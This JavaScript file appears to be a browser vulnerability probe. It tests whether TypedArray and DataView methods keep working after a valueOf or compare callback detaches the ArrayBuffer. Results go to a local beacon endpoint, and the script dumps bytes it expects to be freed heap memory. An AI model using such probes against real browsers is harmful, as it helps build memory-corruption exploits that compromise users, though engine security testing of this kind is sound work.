/*
 * p420 -- Test fill/sort/set/slice/indexOf with detach during valueOf
 *
 * copyWithin catches detach. But other TypedArray methods might not.
 * Each method calls valueOf on arguments -> detach opportunity.
 *
 * Beacon prefix: V420-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V420-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

function detachAB(ab) {
  structuredClone(ab, {transfer: [ab]});
}

// T1: fill(value, start, end) -- valueOf on value
function t1_fill_detach() {
  B("T1-START");
  var ab = new ArrayBuffer(4096);
  var u8 = new Uint8Array(ab);
  for (var i = 0; i < 4096; i++) u8[i] = 0xAA;

  var detached = false;
  var fillErr = null;
  try {
    u8.fill({
      valueOf: function() {
        detachAB(ab);
        detached = true;
        return 0xFF;
      }
    });
  } catch(e) {
    fillErr = e.message;
  }

  B("T1-FILL", {detached: detached, err: fillErr ? fillErr.slice(0, 80) : null, abLen: ab.byteLength});
  if (detached && !fillErr) B("T1-OOB", "fill ran on detached buffer!");
  return detached && !fillErr;
}

// T2: fill with start valueOf
function t2_fill_start_detach() {
  B("T2-START");
  var ab = new ArrayBuffer(4096);
  var u8 = new Uint8Array(ab);
  for (var i = 0; i < 4096; i++) u8[i] = 0xAA;

  var detached = false;
  var fillErr = null;
  try {
    u8.fill(0xFF, {
      valueOf: function() {
        detachAB(ab);
        detached = true;
        return 0;
      }
    });
  } catch(e) {
    fillErr = e.message;
  }

  B("T2-FILL", {detached: detached, err: fillErr ? fillErr.slice(0, 80) : null});
  if (detached && !fillErr) B("T2-OOB", "fill+start ran on detached buffer!");
  return detached && !fillErr;
}

// T3: sort with compareFn that detaches
function t3_sort_detach() {
  B("T3-START");
  var ab = new ArrayBuffer(4096);
  var u8 = new Uint8Array(ab);
  for (var i = 0; i < 4096; i++) u8[i] = (i * 7) & 0xFF;

  var detached = false;
  var sortErr = null;
  var compareCalls = 0;
  try {
    u8.sort(function(a, b) {
      compareCalls++;
      if (compareCalls === 10 && !detached) {
        detachAB(ab);
        detached = true;
      }
      return a - b;
    });
  } catch(e) {
    sortErr = e.message;
  }

  B("T3-SORT", {detached: detached, err: sortErr ? sortErr.slice(0, 80) : null, calls: compareCalls});
  if (detached && !sortErr) B("T3-OOB", "sort ran on detached buffer!");
  return detached && !sortErr;
}

// T4: set(source, offset) -- valueOf on offset
function t4_set_detach() {
  B("T4-START");
  var ab = new ArrayBuffer(4096);
  var u8 = new Uint8Array(ab);
  for (var i = 0; i < 4096; i++) u8[i] = 0xAA;

  var src = new Uint8Array(256);
  for (var i = 0; i < 256; i++) src[i] = 0xFF;

  var detached = false;
  var setErr = null;
  try {
    u8.set(src, {
      valueOf: function() {
        detachAB(ab);
        detached = true;
        return 0;
      }
    });
  } catch(e) {
    setErr = e.message;
  }

  B("T4-SET", {detached: detached, err: setErr ? setErr.slice(0, 80) : null});
  if (detached && !setErr) B("T4-OOB", "set ran on detached buffer!");
  return detached && !setErr;
}

// T5: slice(begin, end) -- valueOf on begin
function t5_slice_detach() {
  B("T5-START");
  var ab = new ArrayBuffer(4096);
  var u8 = new Uint8Array(ab);
  for (var i = 0; i < 4096; i++) u8[i] = 0xBB;

  var detached = false;
  var sliceErr = null;
  var sliceResult = null;
  try {
    sliceResult = u8.slice({
      valueOf: function() {
        detachAB(ab);
        detached = true;
        return 0;
      }
    }, 256);
  } catch(e) {
    sliceErr = e.message;
  }

  B("T5-SLICE", {
    detached: detached,
    err: sliceErr ? sliceErr.slice(0, 80) : null,
    resultLen: sliceResult ? sliceResult.length : null
  });
  if (detached && !sliceErr) {
    B("T5-OOB", "slice read from detached buffer!");
    // Check what we read -- should be freed heap data
    var hex = "";
    for (var i = 0; i < Math.min(64, sliceResult.length); i++) {
      hex += (sliceResult[i] >>> 0).toString(16).padStart(2, "0");
    }
    B("T5-DATA", hex);
  }
  return detached && !sliceErr;
}

// T6: indexOf(value) -- valueOf on value
function t6_indexOf_detach() {
  B("T6-START");
  var ab = new ArrayBuffer(4096);
  var u8 = new Uint8Array(ab);
  for (var i = 0; i < 4096; i++) u8[i] = 0xCC;

  var detached = false;
  var indexErr = null;
  var indexResult = null;
  try {
    indexResult = u8.indexOf({
      valueOf: function() {
        detachAB(ab);
        detached = true;
        return 0xCC;
      }
    });
  } catch(e) {
    indexErr = e.message;
  }

  B("T6-INDEXOF", {detached: detached, err: indexErr ? indexErr.slice(0, 80) : null, result: indexResult});
  if (detached && !indexErr) B("T6-OOB", "indexOf searched detached buffer!");
  return detached && !indexErr;
}

// T7: subarray(begin, end) -- valueOf on begin
function t7_subarray_detach() {
  B("T7-START");
  var ab = new ArrayBuffer(4096);
  var u8 = new Uint8Array(ab);
  for (var i = 0; i < 4096; i++) u8[i] = 0xDD;

  var detached = false;
  var subErr = null;
  var subResult = null;
  try {
    subResult = u8.subarray({
      valueOf: function() {
        detachAB(ab);
        detached = true;
        return 0;
      }
    }, 256);
  } catch(e) {
    subErr = e.message;
  }

  B("T7-SUBARRAY", {
    detached: detached,
    err: subErr ? subErr.slice(0, 80) : null,
    resultLen: subResult ? subResult.length : null
  });
  if (detached && !subErr && subResult && subResult.length > 0) {
    B("T7-OOB", "subarray created view on detached buffer!");
    // Try reading through it
    try {
      var hex = "";
      for (var i = 0; i < Math.min(64, subResult.length); i++) {
        hex += (subResult[i] >>> 0).toString(16).padStart(2, "0");
      }
      B("T7-DATA", hex);
    } catch(e) {
      B("T7-READ-ERR", e.message.slice(0, 60));
    }
  }
  return detached && !subErr;
}

// T8: DataView methods -- getUint32 with byteOffset valueOf
function t8_dataview_detach() {
  B("T8-START");
  var ab = new ArrayBuffer(4096);
  var dv = new DataView(ab);

  // Fill via Uint8Array first
  var u8 = new Uint8Array(ab);
  for (var i = 0; i < 4096; i++) u8[i] = 0xEE;

  var detached = false;
  var dvErr = null;
  var dvResult = null;
  try {
    dvResult = dv.getUint32({
      valueOf: function() {
        detachAB(ab);
        detached = true;
        return 0;
      }
    });
  } catch(e) {
    dvErr = e.message;
  }

  B("T8-DV", {
    detached: detached,
    err: dvErr ? dvErr.slice(0, 80) : null,
    result: dvResult !== null ? "0x" + (dvResult >>> 0).toString(16) : null
  });
  if (detached && !dvErr) {
    B("T8-OOB", "DataView read from detached buffer!");
    // Read more values
    // Oh wait, dv is on detached ab so these might throw too
    // But if getUint32 worked once, the pointer is cached
  }
  return detached && !dvErr;
}

// Run all
var results = {};
results.t1 = t1_fill_detach();
results.t2 = t2_fill_start_detach();
results.t3 = t3_sort_detach();
results.t4 = t4_set_detach();
results.t5 = t5_slice_detach();
results.t6 = t6_indexOf_detach();
results.t7 = t7_subarray_detach();
results.t8 = t8_dataview_detach();

B("RESULTS", results);
B("DONE");
})();
